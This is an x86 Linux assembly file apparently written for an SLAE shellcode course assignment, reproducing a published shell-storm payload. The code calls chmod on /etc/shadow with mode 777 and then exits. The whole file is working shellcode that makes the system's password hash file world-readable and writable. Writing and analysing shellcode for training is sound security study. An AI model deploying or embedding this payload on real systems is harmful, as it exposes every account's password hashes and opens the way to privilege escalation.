;; SLAE Assignment #6: Original Shellcode chmod 777 shadow
;; Website:  http://blog.jsiob.com
;; SLAE-ID: 1400
;; Original ShellCode: http://shell-storm.org/shellcode/files/shellcode-590.php

global _start			

section .text
_start:

	xor eax,eax
	push eax
	mov al,0xf
	push dword 0x776f6461
	push dword 0x68732f63
	push dword 0x74652f2f
	mov ebx,esp
	xor ecx,ecx
	mov cx,0x1ff
	int 0x80
	inc eax
	int 0x80
